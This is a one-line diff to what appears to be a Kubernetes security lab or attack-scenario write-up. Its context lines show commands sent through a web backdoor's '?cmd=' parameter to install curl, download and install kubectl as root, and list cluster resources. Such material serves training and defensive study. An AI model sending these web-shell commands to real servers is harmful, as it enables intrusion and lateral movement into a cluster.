@@ -30,7 +30,7 @@ Application vulnerabilities can bring wide range of different entrypoints. In ad
 - use the backdoor to install `kubectl`:
   - `?cmd=apt-get+update`
   - `?cmd=apt-get+-y+install+curl`
-  - Next, from https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/:
+  - Next, from https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/ :
   - `?cmd=curl%20-LO%20%22https://dl.k8s.io/release/$(curl%20-L%20-s%20https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl%22`
   - `?cmd=install%20-o%20root%20-g%20root%20-m%200755%20kubectl%20/usr/local/bin/kubectl`
   - `?cmd=kubectl+get+all`
